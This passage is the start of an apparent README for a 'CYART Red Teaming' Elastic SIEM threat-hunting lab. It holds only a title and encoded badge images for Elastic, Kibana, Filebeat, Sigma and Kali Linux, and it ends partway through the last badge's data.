# 🔥 CYART Red Teaming — Elastic SIEM Threat Hunting Lab

![](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDguNzUiIGhlaWdodD0iMjgiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iRUxBU1RJQzogU0lFTSI+PHRpdGxlPkVMQVNUSUM6IFNJRU08L3RpdGxlPjxnIHNoYXBlLXJlbmRlcmluZz0iY3Jpc3BFZGdlcyI+PHJlY3Qgd2lkdGg9IjkxLjc1IiBoZWlnaHQ9IjI4IiBmaWxsPSIjNTU1Ii8+PHJlY3QgeD0iOTEuNzUiIHdpZHRoPSI1NyIgaGVpZ2h0PSIyOCIgZmlsbD0iIzAwNTU3MSIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMDAiPjxpbWFnZSB4PSI5IiB5PSI3IiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm1hV3hzUFNKM2FHbDBaWE50YjJ0bElpQnliMnhsUFNKcGJXY2lJSFpwWlhkQ2IzZzlJakFnTUNBeU5DQXlOQ0lnZUcxc2JuTTlJbWgwZEhBNkx5OTNkM2N1ZHpNdWIzSm5Mekl3TURBdmMzWm5JajQ4ZEdsMGJHVStSV3hoYzNScFl6d3ZkR2wwYkdVK1BIQmhkR2dnWkQwaVRUSXdMak0wTlNBeE5pNHpNMnd0TXk0NU5Ua3RMamt5TmkweExqQTFMVEl1TURFZ05TNHhOemN0TkM0MU16VmhNeTQ1TmpJZ015NDVOaklnTUNBd01USXVOVFU1SURNdU56QXlJRFF1TURBMklEUXVNREEySURBZ01ERXRNaTQzTWpjZ015NDNOMjB0TWk0NU56WWdOQzQyT0dNdExqWXhOaUF3TFRFdU1qSXRMakl3TnkweExqY3hOQzB1TlRnM2JDNDNPREl0TkM0d056Y2dNeTQxT1RZdU9EUXhZeTR4TVRVdU16RXVNVGN5TGpZME1pNHhOekl1T1RnM1lUSXVPRE01SURJdU9ETTVJREFnTURFdE1pNDRNellnTWk0NE16WnRMVEl1TmpNM0xTNDFPRFpoTlM0NU1pQTFMamt5SURBZ01ERXROQzQ1TURnZ01pNDJRVFV1T1RRM0lEVXVPVFEzSURBZ01ERTBJREUxTGprd05XdzFMakUyTnkwMExqWTNJRFV1TWpjeUlESXVOREF6SURFdU1UWTNJREl1TWpONlRTNDVNamdnTVRFdU5EUXpZVFF1TURBM0lEUXVNREEzSURBZ01ERXlMamN5TmkwekxqYzNiRE11T1RVdU9UTXpMamt5TnlBeExqazRMVFV1TURVZ05DNDFOalZoTXk0NU55QXpMamszSURBZ01ERXRNaTQxTlRNdE15NDNNRGh0TlM0M01ETXRPQzQwTldFeUxqZzBNU0F5TGpnME1TQXdJREF4TVM0M01qTXVOVGhzTFM0M09Ea2dOQzR3T1RJdE15NDFPVGd0TGpnMVlUSXVPRFF5SURJdU9EUXlJREFnTURFdExqRTNNaTB1T1RnMlFUSXVPRFFnTWk0NE5DQXdJREF4Tmk0Mk15QXlMams1TW0weUxqWTJMalU1UVRVdU9USWdOUzQ1TWlBd0lEQXhNakF1TVNBMkxqa3pZekFnTGpRdExqQXpPQzQzT0RFdExqRXhOQ0F4TGpFMk5Hd3ROUzR5T1RrZ05DNDJORE10TlM0eU5URXRNaTR6T1RRdE1TNHdNall0TWk0eE9YcE5NalFnTVRJdU5UY3hZVFF1TnpJeklEUXVOekl6SURBZ01EQXRNeTR4TWpRdE5DNDBOVFFnTmk0Mk9UVWdOaTQyT1RVZ01DQXdNQzR4TWpZdE1TNHlPVUUyTGpjNE9TQTJMamM0T1NBd0lEQXdNVFF1TWpJdU1EUTNJRFl1TnpZNUlEWXVOelk1SURBZ01EQTRMamN5TnlBeUxqZzJZVE11TlRnMklETXVOVGcySURBZ01EQXRNaTR5TURRdExqYzFORUV6TGpZd05DQXpMall3TkNBd0lEQXdNeTR4TlNBMkxqazFPU0EwTGpjNE5pQTBMamM0TmlBd0lEQXdNQ0F4TVM0ME16RWdOQzQzTWpjZ05DNDNNamNnTUNBd01ETXVNVE01SURFMUxqbGhOaTQ0TnpZZ05pNDROellnTUNBd01DMHVNVEkwSURFdU1qZzVJRFl1TnpjeklEWXVOemN6SURBZ01EQTJMamMyTlNBMkxqYzJOV015TGpFNUlEQWdOQzR5TWkweExqQTFNaUExTGpRNUxUSXVPREkwWVRNdU5UWTRJRE11TlRZNElEQWdNREF5TGpJd055NDNOamtnTXk0Mk1ETWdNeTQyTURNZ01DQXdNRE11TXpjMExUUXVPRFUwUVRRdU56ZzFJRFF1TnpnMUlEQWdNREF5TkNBeE1pNDFOeklpTHo0OEwzTjJaejQ9Ii8+PHRleHQgdHJhbnNmb3JtPSJzY2FsZSguMSkiIHg9IjU0My43NSIgeT0iMTc1IiB0ZXh0TGVuZ3RoPSI1MDcuNSIgZmlsbD0iI2ZmZiI+RUxBU1RJQzwvdGV4dD48dGV4dCB0cmFuc2Zvcm09InNjYWxlKC4xKSIgeD0iMTIwMi41IiB5PSIxNzUiIHRleHRMZW5ndGg9IjMzMCIgZmlsbD0iI2ZmZiIgZm9udC13ZWlnaHQ9ImJvbGQiPlNJRU08L3RleHQ+PC9nPjwvc3ZnPg== "Elastic")  
![](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMzAiIGhlaWdodD0iMjgiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iS0lCQU5BOiBUSFJFQVQgSFVOVElORyI+PHRpdGxlPktJQkFOQTogVEhSRUFUIEhVTlRJTkc8L3RpdGxlPjxnIHNoYXBlLXJlbmRlcmluZz0iY3Jpc3BFZGdlcyI+PHJlY3Qgd2lkdGg9Ijg3LjUiIGhlaWdodD0iMjgiIGZpbGw9IiM1NTUiLz48cmVjdCB4PSI4Ny41IiB3aWR0aD0iMTQyLjUiIGhlaWdodD0iMjgiIGZpbGw9IiNmMDRlOTgiLz48L2c+PGcgZmlsbD0iI2ZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZm9udC1mYW1pbHk9IlZlcmRhbmEsR2VuZXZhLERlamFWdSBTYW5zLHNhbnMtc2VyaWYiIHRleHQtcmVuZGVyaW5nPSJnZW9tZXRyaWNQcmVjaXNpb24iIGZvbnQtc2l6ZT0iMTAwIj48aW1hZ2UgeD0iOSIgeT0iNyIgd2lkdGg9IjE0IiBoZWlnaHQ9IjE0IiBocmVmPSJkYXRhOmltYWdlL3N2Zyt4bWw7YmFzZTY0LFBITjJaeUJtYVd4c1BTSjNhR2wwWlhOdGIydGxJaUJ5YjJ4bFBTSnBiV2NpSUhacFpYZENiM2c5SWpBZ01DQXlOQ0F5TkNJZ2VHMXNibk05SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpJd01EQXZjM1puSWo0OGRHbDBiR1UrUzJsaVlXNWhQQzkwYVhSc1pUNDhjR0YwYUNCa1BTSk5NaTQyTWpVZ01IWXlNUzQxT1RGTU1qRXVNemMxSURCNmJURXdMamcyTkNBeE1pNDBOMHd6TGpRM055QXlOR2d4Tnk0MU1qSmhNVGd1TnpVMUlERTRMamMxTlNBd0lEQWdNQzAzTGpVeExURXhMalV6ZWlJdlBqd3ZjM1puUGc9PSIvPjx0ZXh0IHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB4PSI1MjIuNSIgeT0iMTc1IiB0ZXh0TGVuZ3RoPSI0NjUiIGZpbGw9IiNmZmYiPktJQkFOQTwvdGV4dD48dGV4dCB0cmFuc2Zvcm09InNjYWxlKC4xKSIgeD0iMTU4Ny41IiB5PSIxNzUiIHRleHRMZW5ndGg9IjExODUiIGZpbGw9IiNmZmYiIGZvbnQtd2VpZ2h0PSJib2xkIj5USFJFQVQgSFVOVElORzwvdGV4dD48L2c+PC9zdmc+ "Kibana")  
![](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMzguNSIgaGVpZ2h0PSIyOCIgcm9sZT0iaW1nIiBhcmlhLWxhYmVsPSJGSUxFQkVBVDogTE9HIENPTExFQ1RJT04iPjx0aXRsZT5GSUxFQkVBVDogTE9HIENPTExFQ1RJT048L3RpdGxlPjxnIHNoYXBlLXJlbmRlcmluZz0iY3Jpc3BFZGdlcyI+PHJlY3Qgd2lkdGg9Ijk5IiBoZWlnaHQ9IjI4IiBmaWxsPSIjNTU1Ii8+PHJlY3QgeD0iOTkiIHdpZHRoPSIxMzkuNSIgaGVpZ2h0PSIyOCIgZmlsbD0iIzAwYmZiMyIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMDAiPjxpbWFnZSB4PSI5IiB5PSI3IiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm1hV3hzUFNKM2FHbDBaWE50YjJ0bElpQnliMnhsUFNKcGJXY2lJSFpwWlhkQ2IzZzlJakFnTUNBeU5DQXlOQ0lnZUcxc2JuTTlJbWgwZEhBNkx5OTNkM2N1ZHpNdWIzSm5Mekl3TURBdmMzWm5JajQ4ZEdsMGJHVStRbVZoZEhNOEwzUnBkR3hsUGp4d1lYUm9JR1E5SWsweUxqWXlOU0F3ZGpFMWFEZ3VNalZoTnk0MUlEY3VOU0F3SURBZ01DQXdMVEUxZW0weE55NHdNVFlnTVRFdU56QTFZeTB4TGpVM01TQXpMakkyTVMwMExqa3hJRFV1TlRFM0xUZ3VOelkySURVdU5URTNhQzA0TGpJMVZqSTBhREV4TGpJMVlUY3VOU0EzTGpVZ01DQXdJREFnTlM0M05qWXRNVEl1TWprMWVpSXZQand2YzNablBnPT0iLz48dGV4dCB0cmFuc2Zvcm09InNjYWxlKC4xKSIgeD0iNTgwIiB5PSIxNzUiIHRleHRMZW5ndGg9IjU4MCIgZmlsbD0iI2ZmZiI+RklMRUJFQVQ8L3RleHQ+PHRleHQgdHJhbnNmb3JtPSJzY2FsZSguMSkiIHg9IjE2ODcuNSIgeT0iMTc1IiB0ZXh0TGVuZ3RoPSIxMTU1IiBmaWxsPSIjZmZmIiBmb250LXdlaWdodD0iYm9sZCI+TE9HIENPTExFQ1RJT048L3RleHQ+PC9nPjwvc3ZnPg== "Filebeat")  
![](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNjMuNSIgaGVpZ2h0PSIyOCIgcm9sZT0iaW1nIiBhcmlhLWxhYmVsPSJTSUdNQTogREVURUNUSU9OIEVOR0lORUVSSU5HIj48dGl0bGU+U0lHTUE6IERFVEVDVElPTiBFTkdJTkVFUklORzwvdGl0bGU+PGcgc2hhcGUtcmVuZGVyaW5nPSJjcmlzcEVkZ2VzIj48cmVjdCB3aWR0aD0iNjQuMjUiIGhlaWdodD0iMjgiIGZpbGw9IiM1NTUiLz48cmVjdCB4PSI2NC4yNSIgd2lkdGg9IjE5OS4yNSIgaGVpZ2h0PSIyOCIgZmlsbD0iIzAwMDAwMCIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMDAiPjx0ZXh0IHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB4PSIzMjEuMjUiIHk9IjE3NSIgdGV4dExlbmd0aD0iNDAyLjUiIGZpbGw9IiNmZmYiPlNJR01BPC90ZXh0Pjx0ZXh0IHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB4PSIxNjM4Ljc1IiB5PSIxNzUiIHRleHRMZW5ndGg9IjE3NTIuNSIgZmlsbD0iI2ZmZiIgZm9udC13ZWlnaHQ9ImJvbGQiPkRFVEVDVElPTiBFTkdJTkVFUklORzwvdGV4dD48L2c+PC9zdmc+ "Sigma")  
![](data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMzQuMjUiIGhlaWdodD0iMjgiIHJvbGU9ImltZyIgYXJpYS1sYWJlbD0iTElOVVg6IEtBTEkiPjx0aXRsZT5MSU5VWDogS0FMSTwvdGl0bGU+PGcgc2hhcGUtcmVuZGVyaW5nPSJjcmlzcEVkZ2VzIj48cmVjdCB3aWR0aD0iNzguMjUiIGhlaWdodD0iMjgiIGZpbGw9IiM1NTUiLz48cmVjdCB4PSI3OC4yNSIgd2lkdGg9IjU2IiBoZWlnaHQ9IjI4IiBmaWxsPSIjMDAwMDAwIi8+PC9nPjxnIGZpbGw9IiNmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZvbnQtZmFtaWx5PSJWZXJkYW5hLEdlbmV2YSxEZWphVnUgU2FucyxzYW5zLXNlcmlmIiB0ZXh0LXJlbmRlcmluZz0iZ2VvbWV0cmljUHJlY2lzaW9uIiBmb250LXNpemU9IjEwMCI+PGltYWdlIHg9IjkiIHk9IjciIHdpZHRoPSIxNCIgaGVpZ2h0PSIxNCIgaHJlZj0iZGF0YTppbWFnZS9zdmcreG1sO2Jhc2U2NCxQSE4yWnlCbWFXeHNQU0lqUmtORE5qSTBJaUJ5YjJ4bFBTSnBiV2NpSUhacFpYZENiM2c5SWpBZ01DQXlOQ0F5TkNJZ2VHMXNibk05SW1oMGRIQTZMeTkzZDNjdWR6TXViM0puTHpJd01EQXZjM1puSWo0OGRHbDBiR1UrVEdsdWRYZzhMM1JwZEd4bFBqeHdZWFJvSUdROUlrMHhNaTQxTURRZ01HTXRMakUxTlNBd0xTNHpNVFV1TURBNExTNDBPQzR3TWpFdE5DNHlNall1TXpNekxUTXVNVEExSURRdU9EQTNMVE11TVRjZ05pNHlPVGd0TGpBM05pQXhMakE1TWkwdU15QXhMamsxTXkweExqQTFJRE11TURJdExqZzROU0F4TGpBMU1TMHlMakV5TnlBeUxqYzFMVEl1TnpFMklEUXVOVEl4TFM0eU56Z3VPRE15TFM0ME1TQXhMalk0TkMwdU1qZzNJREl1TkRnNVlTNDBNalF1TkRJMElEQWdNREF0TGpFeExqRXpOV010TGpJMkxqSTJPQzB1TkRVdU5pMHVOall6TGpnek9TMHVNVGs1TGpFNU9TMHVORGcxTGpJMk55MHVOemszTGpRdExqTXhNeTR4TXpZdExqWTFPQzR5TmprdExqZzJOQzQyT0MwdU1Ea3VNVGc1TFM0eE16WXVNemswTFM0eE16SXVOakF5SURBZ0xqRTVPUzR3TWpjdU5DNHdOVFV1TlRNMkxqQTFPQzR6T1RrdU1URTJMamN5T0M0d05DNDVOeTB1TWpRNUxqWTRMUzR5T0NBeExqRTBOUzB1TVRBMklERXVORGcwTGpFM05DNHpNelF1TlRNMUxqUTNMamswTGpZd01TNDRNUzR5SURFdU9URXVNVE0xSURJdU56YzBMall1T1RJMkxqUTJOaUF4TGpnMk5pNDJOeUF5TGpZeE5pNDBOeTQxTWpZdExqRXhOaTQ1TnkwdU5EWTBJREV1TWpBNExTNDVORFl1TlRnM0xTNHdNRE1nTVM0eU15MHVNalk1SURJdU1qWXRMak16TkM0Mk9Ua3RMakExT0NBeExqVTNOQzR5TmpjZ01pNDFOemN1TWk0d01qVXVNVE0wTGpBMk15NHhPVGd1TVRFMExqTXpNMnd1TURBekxqQXdNMk11TXpreExqYzNPQ0F4TGpFeE15QXhMakV6TWlBeExqZzROQ0F4TGpBM01TNDNOekV0TGpBMklERXVOVGt5TFM0MU16WWdNaTR5TlRjdE1TNHpNRFl1TmpNeExTNDNOalVnTVM0Mk9ETXRNUzR3T0RRZ01pNHpOemd0TVM0MU1ETXVNelE0TFM0eE9Ua3VOakk1TFM0ME5qa3VOalE1TFM0NE5UTXVNREl6TFM0MExTNHlMUzQ0TVRFdExqY3hOQzB4TGpNM05uWXRMakE1TjJ3dExqQXdNeTB1TURBell5MHVNVGN0TGpJdExqSTFMUzQxTXpVdExqTXpPQzB1T1RJMkxTNHdPRFV0TGpRd01TMHVNVGd5TFM0M09EWXRMalE1TWkweExqQTBObWd0TGpBd00yTXRMakExT1MwdU1EVTBMUzR4TWpNdExqQTJOeTB1TVRnNExTNHhNelZoTGpNMU55NHpOVGNnTUNBd01DMHVNVGt0TGpBMk5HTXVORE14TFRFdU1qYzRMakkyTkMweUxqVTFMUzR4TnpNdE15NDJPVFF0TGpVek15MHhMalF4TFRFdU5EWTFMVEl1TmpNNExUSXVNVGMxTFRNdU5EZ3pMUzQzT1RZdE1TNHdNRFV0TVM0MU56WXRNUzQ1TlRjdE1TNDFOaTB6TGpNMk9DNHdNall0TWk0eE5USXVNak0yTFRZdU1UTXpMVE11TlRRMExUWXVNVE01ZW0wdU5USTVJRE11TkRBMWFDNHdNVE5qTGpJeE15QXdJQzR6T1RZdU1EWXlMalU0TkM0eE9UZ3VNVGt1TVRNMUxqTXpMak16TWk0ME16Z3VOVE16TGpFd05TNHlOVGt1TVRVNExqUTFPUzR4TmpZdU56STBJREF0TGpBeUxqQXdOaTB1TURRdU1EQTJMUzR3Tm5ZdU1UQTFZUzR3T0RZdU1EZzJJREFnTURFdExqQXdOQzB1TURJeGJDMHVNREEwTFM0d01qUmhNUzQ0TURjZ01TNDRNRGNnTUNBd01TMHVNVFV1TnpBMkxqazFNeTQ1TlRNZ01DQXdNUzB1TWpFekxqTXpOUzQzTVM0M01TQXdJREF3TFM0d09EZ3RMakEwTW1NdExqRXdOQzB1TURRMUxTNHhPVGd0TGpBMk5DMHVNamcwTFM0eE16TmhNUzR6TVRJZ01TNHpNVElnTUNBd01DMHVNakl0TGpBMk5tTXVNRFV0TGpBMkxqRTBOaTB1TVRNekxqRTRNeTB1TVRrNExqQTFNeTB1TVRJNExqQTRNaTB1TWpZMExqQTRPQzB1TkRBeWRpMHVNREpoTVM0eU1TQXhMakl4SURBZ01EQXRMakEyTVMwdU5HTXRMakEwTlMwdU1UTTBMUzR4TURFdExqSXRMakU0TXkwdU16TXpMUzR3T0RRdExqQTJOaTB1TVRZM0xTNHhNekl0TGpJMk55MHVNVE15YUMwdU1ERTJZeTB1TURreklEQXRMakUzTmk0d015MHVNall5TGpFek1tRXVPQzQ0SURBZ01EQXRMakl3TlM0ek16UWdNUzR4T0NBeExqRTRJREFnTURBdExqQTVMalIyTGpBeE9XTXVNREF5TGpBNE9TNHdNRGd1TVRjNUxqQXlMakkyTnkwdU1Ua3pMUzR3TmpjdExqUXpPQzB1TVRNMUxTNDJNRGN0TGpJd01tRXhMall6TlNBeExqWXpOU0F3SURBeExTNHdNVGd0TGpKMkxTNHdNbUV4TGpjM01pQXhMamMzTWlBd0lEQXhMakUxTFM0M05qaGpMakE0TWkwdU1qSXVNak15TFM0ME1EWXVORE10TGpVek0yRXVPVGcxTGprNE5TQXdJREF4TGpVNU5DMHVNbnB0TFRJdU9UWXlMakExT1dndU1ETTJZeTR4TkRJZ01DQXVNamN1TURRNExqTTVPUzR4TXpVdU1UUTJMakV5T1M0eU5qUXVNamc0TGpNME5DNDBOalV1TURrdU1UazVMakUwTGpRdU1UVXpMalkyTjNZdU1EQTBZeTR3TURjdU1UTTBMakF3Tmk0eUxTNHdNREl1TWpZMmRpNHdPR010TGpBekxqQXdOeTB1TURVMkxqQXhPQzB1TURnekxqQXlOQzB1TVRVeUxqQTFOUzB1TWpjMExqRXpOUzB1TXprekxqSXVNREV5TFM0d09TNHdNVE10TGpFNExqQXdNeTB1TWpZM2RpMHVNREUxWXkwdU1ERXlMUzR4TXpNdExqQTBMUzR5TFM0d09ESXRMak16TTJFdU5qRXpMall4TXlBd0lEQXdMUzR4TmpZdExqSTJOeTR5TkRndU1qUTRJREFnTURBdExqRTRNeTB1TURZMGFDMHVNREl4WXkwdU1EY3hMakF3TmkwdU1UTXVNRFF0TGpFNE5pNHhNekpoTGpVMU1pNDFOVElnTUNBd01DMHVNVEl1TWpjdU9UUTBMamswTkNBd0lEQXdMUzR3TWpNdU16TjJMakF4TldNdU1ERXlMakV6TlM0d016Y3VNaTR3T0M0ek16UXVNRFEyTGpFek5DNHdPVGd1TWk0eE5qWXVNalk0TGpBeExqQXdPUzR3TWk0d01UZ3VNRE0wTGpBeU5DMHVNRGN1TURVM0xTNHhNVGN1TURjdExqRTNOaTR4TXpaaExqTXdOQzR6TURRZ01DQXdNUzB1TVRNeExqQTJPQ0F5TGpZeUlESXVOaklnTUNBd01TMHVNamMxTFM0ME1ESWdNUzQzTnpJZ01TNDNOeklnTUNBd01TMHVNVFUxTFM0Mk5qY2dNUzQzTlRrZ01TNDNOVGtnTUNBd01TNHdPQzB1TmpZNElERXVORE1nTVM0ME15QXdJREF4TGpJNE15MHVOVE0xWXk0eE1qZ3RMakV6TXk0eU5pMHVNaTQwTVRndExqSjZiVEV1TXpjZ01TNDNNRFpqTGpNek1pQXdJQzQzTXpNdU1EWTFJREV1TWpFMkxqTTVPUzR5T1RNdU1pNDFNak11TWpZNUlERXVNRFV5TGpRMk9HZ3VNREF6WXk0eU5UVXVNVE0yTGpRd05TNHlOall1TkRjNExqTTVPWFl0TGpFek1XRXVOVGN4TGpVM01TQXdJREF4TGpBeE5pNDBOMk10TGpFeU15NHpNUzB1TlRFMkxqWTBNeTB4TGpBMk15NDROREoyTGpBd01tTXRMakkyT0M0eE16VXRMalV3TVM0ek16TXRMamMzTlM0ME5qVXRMakkzTmk0eE16VXRMalU0T0M0eU9USXRNUzR3TVRJdU1qWTNZVEV1TVRNNUlERXVNVE01SURBZ01ERXRMalEwT0MwdU1EWTNJRE11TlRZMklETXVOVFkySURBZ01ERXRMak15TWkwdU1UazRZeTB1TVRrMUxTNHhNelV0TGpNMk15MHVNek15TFM0Mk1USXRMalEyTlhZdExqQXdOV2d0TGpBd05XTXRMalF0TGpJME5pMHVOakUyTFM0MU1USXRMalk0TmkwdU56RXRMakEzTFM0eU5qZ3RMakF3TlMwdU5EY3VNVGt6TFM0MkxqSXlOQzB1TVRNMUxqTTRMUzR5TnpFdU5EZ3pMUzR6TXpZdU1UQTBMUzR3TnpRdU1UUXpMUzR4TURJdU1UYzJMUzR4TXpGb0xqQXdNbll0TGpBd00yTXVNVFk1TFM0eU1ESXVORE0yTFM0ME55NDRNemt0TGpZd01TNHhNemt0TGpBek5pNHlPVFF0TGpBMk5TNDBOall0TGpBMk5YcHRNaTQ0SURJdU1UUXlZeTR6TlRnZ01TNDBNVGNnTVM0eE9UWWdNeTQwTnpVZ01TNDNNelVnTkM0ME56TXVNamcyTGpVek5DNDROVFVnTVM0Mk5Ua2dNUzR4TURJZ015NHdNalF1TVRVMkxTNHdNRFV1TXpNdU1ERTRMalV4TXk0d05qUXVOalEyTFRFdU5qY3hMUzQxTkRZdE15NDBOamN0TVM0d09Ea3RNeTQ1TmpZdExqSXlMUzR5TFM0eU16SXRMak16TlMwdU1USXpMUzR6TXpVdU5Ua3VOVE0wSURFdU16WTFJREV1TlRjeUlERXVOalEySURJdU56VTNMakV6TGpVek5TNHhOaUF4TGpFd05DNHdNakVnTVM0Mk55NHdOamN1TURJNExqRXpOUzR3Tmk0eU1EVXVNRFkzSURFdU1ETXlMalV6TkNBeExqUXhNeTQ1TXpnZ01TNHlNeUF4TGpVek4zWXRMakEwTTJNdExqQTJMUzR3TURNdExqRXlJREF0TGpFNElEQm9MUzR3TVRaakxqRTFNUzB1TkRZM0xTNHhPREl0TGpneU5TMHhMakEyTlMweExqSXlOQzB1T1RFMUxTNDBMVEV1TmpRMkxTNHpNell0TVM0M055NDBOalV0TGpBd09DNHdORE10TGpBeE15NHdOall0TGpBeE9DNHhNelV0TGpBMk9DNHdNak10TGpFek9TNHdOVE10TGpJd09TNHdOalF0TGpRekxqSTJPQzB1TmpZeUxqWTJPUzB1TnpreklERXVNVGczTFM0eE15NDFNek10TGpFM0lERXVNVFUyTFM0eU1EVWdNUzQ0TmpsMkxqQXdNMk10TGpBeUxqTXpOQzB1TVRjdU9ETTRMUzR6TVRrZ01TNHpOUzB4TGpVZ01TNHdOekl0TXk0MU9DQXhMalV6T0MwMUxqTTBPQzR6TXpSaE1pNDJORFVnTWk0Mk5EVWdNQ0F3TUMwdU5EQXlMUzQxTXpNZ01TNDBOU0F4TGpRMUlEQWdNREF0TGpJM05TMHVNek16WXk0eE9ESWdNQ0F1TXpNNExTNHdNeTQwTmpVdExqQTJOMkV1TmpFMUxqWXhOU0F3SURBd0xqTXhOQzB1TXpNMFl5NHhNRGd0TGpJMk55QXdMUzQyT1RjdExqTTBOUzB4TGpFMk15MHVNelExTFM0ME5qY3RMamt6TVMwdU9UazFMVEV1TnpnNExURXVOVEl4TFM0Mk15MHVOQzB1T1RnMkxTNDROeTB4TGpFMUxURXVNemsyTFM0eE5qVXRMalV6TkMwdU1UUXpMVEV1TURnMUxTNHdNVFV0TVM0Mk5EVXVNalExTFRFdU1EY3VPRGN6TFRJdU1URWdNUzR5TnpRdE1pNDNOak11TVRBM0xTNHdOalV1TURNM0xqRXpOUzB1TkRBNExqazNOQzB1TXprMkxqYzFNUzB4TGpFMElESXVORGszTFM0eE1qSWdNeTQ0TlRSaE9DNHhNak1nT0M0eE1qTWdNQ0F3TVM0Mk5EY3RNaTQ0TnpaakxqVTJOQzB4TGpJM09DQXhMamMwTXkwekxqVXdOQ0F4TGpnek5pMDFMakkyT0M0d05EZ3VNRE0yTGpJeE55NHhNelV1TWpnNUxqSXdNaTR5TVRndU1UTXpMak00TGpNek15NDFPUzQwTmpVdU1qRXVNakF4TGpRM055NHpNelV1T0RjMkxqTXpOUzR3TXprdU1EQXpMakEzTlM0d01EWXVNVEV1TURBMkxqUXhNaUF3SUM0M015MHVNVE0wTGprNU55MHVNalk0TGpJNUxTNHhNelF1TlRJdExqTXpOQzQzTkMwdU5HZ3VNREExWXk0ME5qY3RMakV6TlM0NE16VXRMalF3TWlBeExqQTBOQzB1TjNwdE1pNHhPRFVnT0M0NU5UaGpMakF6Tnk0MkxqTTBNeUF4TGpJME5TNDRPRElnTVM0ek56Y3VOVGc0TGpFek5DQXhMalF6TkMwdU16TXpJREV1TnpreExTNDNOalZzTGpJeE1TMHVNREZqTGpNeE5TMHVNREEzTGpVM055NHdNUzQ0TkRjdU1qWTRiQzR3TURNdU1EQXpZeTR5TURndU1UazVMak13TlM0MU15NHpPVEV1T0RjMkxqQTROUzQwTGpFMU5DNDNPQzQwTURrZ01TNHdOall1TkRnMkxqVXlOeTQyTkRVdU9UQTJMall6TmlBeExqRTBiQzR3TURNdExqQXdOM1l1TURFNGJDMHVNREF6TFM0d01USmpMUzR3TVRVdU1qWXlMUzR4T0RVdU16azJMUzQwT1RndU5UazFMUzQyTXk0ME1ERXRNUzQzTkRZdU56RXlMVEl1TkRVM0lERXVOVGN0TGpZeE9DNDNNemN0TVM0ek55QXhMakUwTFRJdU1ETTJJREV1TVRreExTNDJOalF1TURVekxURXVNak0zTFM0eUxURXVOVGMwTFM0NE9UaHNMUzR3TURVdExqQXdNMk10TGpJeExTNDBMUzR4TWkweExqQXlOUzR3TlRZdE1TNDJPUzR4TnpZdExqWTJPQzQwTWpndE1TNHpORFF1TkRZekxURXVPRGszTGpBek55MHVOekUwTGpBM05pMHhMak16TlM0eE9UVXRNUzQ0TVRRdU1USXRMalEyTlM0ek1EZ3RMamM1Tnk0Mk5ERXRMams0Tkd3dU1EUTFMUzR3TWpKNmJTMHhNQzQ0TVRRdU1EUTVhQzR3TVdNdU1EVXpJREFnTGpFd05TNHdNRFV1TVRVM0xqQXhOQzR6TnpZdU1EVTFMamN3Tmk0ek16TWdNUzR3TWpNdU56VXliQzQ1TVNBeExqWTJOQzR3TURNdU1EQXpZeTR5TkRNdU5UTXpMamMxTkNBeExqQTJOQ0F4TGpFNE9TQXhMall6Tnk0ME16UXVOVGs0TGpjM0lERXVNVE14TGpjeU9TQXhMalUzZGk0d01EWmpMUzR3TlRjdU56UTBMUzQwT0NBeExqRTBPQzB4TGpFeU5TQXhMakk1TkMwdU5qUTFMakV6TlMweExqVXlMakF3TWkweUxqTTVOUzB1TkRZMExTNDVOamd0TGpVek5pMHlMakV4T0MwdU5EWTVMVEl1T0RVM0xTNDJNREl0TGpNMk9TMHVNRFkyTFM0Mk1TMHVNaTB1TnpJekxTNDBMUzR4TVMwdU1pMHVNVEV6TFM0Mk1ESXVNVEl6TFRFdU1qTjJMUzR3TURSc0xqQXdNaTB1TURBell5NHhNVGN0TGpNek5DNHdNeTB1TnpVeUxTNHdNamN0TVM0eE1UZ3RMakExTlMwdU5EQXhMUzR3T0RNdExqY3hMakEwTXkwdU9UUXVNVFl0TGpNek5DNHpPVFl0TGpRdU5qa3RMalV6TXk0eU9UUXRMakV6TlM0Mk5DMHVNakF5TGpreE5TMHVORGRvTGpBd01uWXRMakF3TW1NdU1qVTJMUzR5TmpndU5EUTFMUzQyTURFdU5